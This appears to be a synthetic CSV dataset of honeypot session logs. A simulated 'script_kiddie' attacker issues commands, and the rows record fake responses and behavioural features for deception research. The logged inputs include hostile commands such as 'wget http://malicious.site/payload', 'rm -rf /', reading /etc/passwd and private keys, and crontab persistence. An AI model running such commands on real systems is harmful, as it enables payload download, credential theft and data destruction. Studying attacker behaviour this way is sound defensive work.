session_id,attacker_id,attacker_profile,timestamp,attacker_input,honeypot_response,attack_type,risk_level,response_success,current_privileges,failed_attempts,session_position,attack_phase,engagement_time,hawkes_intensity,frustration_level,temporal_phase,deception_triggered,data_collected,privilege_escalation_attempt,high_risk_activity,system_state_hash,time_since_session_start,commands_per_minute
2,1,script_kiddie,2025-05-24 23:39:03.220621,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,104,initial_recon,0.1,0.1,0.1,initial_recon,1,1,0,1,-8958916735605131775,114.115235470993,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:03.320621,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,105,initial_recon,0.1351393153188622,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,114.25037478631188,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:03.455761,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,106,initial_recon,0.7376308565285912,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,114.98800564284046,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:04.193392,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,107,initial_recon,0.2537680177650989,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,115.24177366060556,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:04.447160,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,108,initial_recon,0.1,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,115.34177366060555,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:04.547160,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,109,initial_recon,0.2696165252102414,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,115.6113901858158,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:04.816776,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,110,initial_recon,0.2961503825384177,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,115.90754056835422,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:05.112927,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,111,initial_recon,0.5033286401506398,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,116.41086920850486,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:05.616255,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,112,initial_recon,0.6784330651392279,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,117.0893022736441,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:06.294688,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,113,initial_recon,0.1892478263270948,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,117.27855009997118,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:06.483936,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,114,initial_recon,0.1434581101722568,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,117.42200821014345,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:06.627394,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,115,initial_recon,0.698602815695596,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,118.12061102583904,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:07.325997,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,116,initial_recon,0.55160156389214,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,118.67221258973116,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:07.877599,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,117,initial_recon,0.3137129528711054,0.1,0.1,initial_recon,1,1,0,0,-8958916735605131775,118.98592554260227,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:08.191312,crontab -e,Command executed,persistence,3,False,True,1,118,initial_recon,0.4893996519286653,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,119.47532519453095,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:08.680711,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,119,initial_recon,0.4496986694291535,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,119.9250238639601,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:09.130410,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,120,initial_recon,0.1631305262205237,0.1,0.1,initial_recon,1,1,0,0,-8958916735605131775,120.08815439018062,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:09.293540,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,121,initial_recon,0.2528002233088428,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,120.34095461348949,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:09.546341,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,122,initial_recon,0.3049655432196113,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,120.64592015670908,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:09.851306,crontab -e,Command executed,persistence,3,False,True,1,123,initial_recon,0.776995006848036,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,121.42291516355712,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:10.628301,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,124,initial_recon,0.1,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,121.52291516355712,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:10.728301,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,125,initial_recon,0.5449472247473647,0.1,0.1,initial_recon,1,1,0,0,-8958916735605131775,122.06786238830448,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:11.273248,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,126,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,122.16786238830448,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:11.373248,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,127,initial_recon,0.8374669377543752,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,123.00532932605886,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:12.210715,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,128,initial_recon,0.4132339112498407,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,123.41856323730867,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:12.623949,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,129,initial_recon,0.1873743957211687,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,123.60593763302988,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:12.811324,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,130,initial_recon,0.2025258524839457,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,123.8084634855138,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:13.013849,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,131,initial_recon,0.1624217899204161,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,123.97088527543424,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:13.176271,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,132,initial_recon,0.2049668956231849,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,124.1758521710574,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:13.381238,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,133,initial_recon,0.4099376834949563,0.1,0.1,initial_recon,1,1,0,0,-8958916735605131775,124.58578985455236,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:13.791176,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,0,134,initial_recon,0.4694814607173829,0.1,0.0,initial_recon,1,1,0,1,-8958916735605131775,125.05527131526976,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:14.260657,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,135,initial_recon,0.1018039665103832,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,125.15707528178014,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:14.362461,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,136,initial_recon,0.3825401822917843,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,125.53961546407191,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:14.745001,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,137,initial_recon,0.2048982637916089,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,125.74451372786352,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:14.949900,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,138,initial_recon,1.1771294947988844,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,126.9216432226624,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:16.127029,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,139,initial_recon,0.1411911374573686,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,127.06283436011978,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:16.268220,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,140,initial_recon,0.3781377272012291,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,127.440972087321,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:16.646358,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,141,initial_recon,0.2056693522540696,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,127.64664143957508,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:16.852027,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,142,initial_recon,0.4163577319716988,0.1,0.0,initial_recon,1,1,0,1,-8958916735605131775,128.06299917154678,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:17.268385,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,0,143,initial_recon,1.534481614707376,0.1,0.0,initial_recon,1,1,0,1,-8958916735605131775,129.59748078625415,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:18.802867,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,144,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,1,-8958916735605131775,129.69748078625415,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:18.902867,whoami,user,reconnaissance,1,False,True,2,145,initial_recon,0.1,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,129.79748078625414,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:19.002867,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,146,initial_recon,0.5333961215533568,0.1,0.4,initial_recon,1,1,0,0,-8958916735605131775,130.33087690780752,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:19.536263,crontab -e,Command executed,persistence,3,False,True,2,147,initial_recon,1.2989381065270589,0.1,0.3,initial_recon,1,0,0,0,-8958916735605131775,131.62981501433455,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:20.835201,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,148,initial_recon,0.1,0.1,0.5,initial_recon,1,1,0,0,-8958916735605131775,131.72981501433458,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:20.935201,rm -rf /,Command executed,destruction,5,False,True,2,149,initial_recon,0.3651436221636885,0.1,0.4,initial_recon,1,0,0,1,-8958916735605131775,132.09495863649826,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:21.300345,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,1,150,initial_recon,4.076772346762479,0.1,0.6000000000000001,initial_recon,1,0,0,0,-8958916735605131775,136.17173098326074,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:25.377117,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,151,initial_recon,1.1216327798451506,0.1,0.5000000000000001,initial_recon,1,1,0,0,-8958916735605131775,137.29336376310587,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:26.498750,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,152,initial_recon,0.1,0.1,0.4000000000000001,initial_recon,1,0,0,0,-8958916735605131775,137.3933637631059,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:26.598750,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,153,initial_recon,0.1,0.1,0.3000000000000001,initial_recon,1,1,0,1,-8958916735605131775,137.4933637631059,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:26.698750,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,154,initial_recon,0.1218667427651227,0.1,0.2000000000000001,initial_recon,1,0,0,0,-8958916735605131775,137.615230505871,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:26.820617,whoami,user,reconnaissance,1,False,True,1,155,initial_recon,0.1514355285691825,0.1,0.1000000000000001,initial_recon,1,0,0,0,-8958916735605131775,137.7666660344402,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:26.972052,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,156,initial_recon,0.1022655566300388,0.1,0.3000000000000001,initial_recon,1,0,0,0,-8958916735605131775,137.86893159107024,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:27.074318,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,157,initial_recon,0.6018777734923394,0.1,0.2000000000000001,initial_recon,1,0,0,0,-8958916735605131775,138.47080936456257,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:27.676195,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,158,initial_recon,0.1445477641382772,0.1,0.4000000000000001,initial_recon,1,0,0,0,-8958916735605131775,138.61535712870085,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:27.820743,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,159,initial_recon,0.1,0.1,0.3000000000000001,initial_recon,1,0,0,0,-8958916735605131775,138.71535712870084,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:27.920743,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,160,initial_recon,0.2171504865024028,0.1,0.2000000000000001,initial_recon,1,1,0,0,-8958916735605131775,138.93250761520324,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:28.137894,crontab -e,Command executed,persistence,3,False,True,1,161,initial_recon,0.2250172915198641,0.1,0.1000000000000001,initial_recon,1,0,0,0,-8958916735605131775,139.15752490672313,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:28.362911,whoami,user,reconnaissance,1,False,True,2,162,initial_recon,0.1,0.1,0.3000000000000001,initial_recon,1,0,0,0,-8958916735605131775,139.25752490672312,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:28.462911,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,1,163,initial_recon,0.4030147800024714,0.1,0.5000000000000002,initial_recon,1,0,0,0,-8958916735605131775,139.6605396867256,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:28.865926,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,164,initial_recon,0.1,0.1,0.4000000000000002,initial_recon,1,1,0,1,-8958916735605131775,139.7605396867256,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:28.965926,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,165,initial_recon,0.1,0.1,0.3000000000000002,initial_recon,1,1,0,0,-8958916735605131775,139.8605396867256,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:29.065926,rm -rf /,Command executed,destruction,5,True,True,0,166,initial_recon,0.1395093731316452,0.1,0.2000000000000002,initial_recon,1,0,0,1,-8958916735605131775,140.00004905985722,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:29.205435,whoami,user,reconnaissance,1,True,True,0,167,initial_recon,0.1,0.1,0.1000000000000002,initial_recon,1,0,0,0,-8958916735605131775,140.10004905985724,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:29.305435,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,168,initial_recon,0.2356028382502632,0.1,2.498001805406602e-16,initial_recon,1,0,0,0,-8958916735605131775,140.3356518981075,81.04746336600701
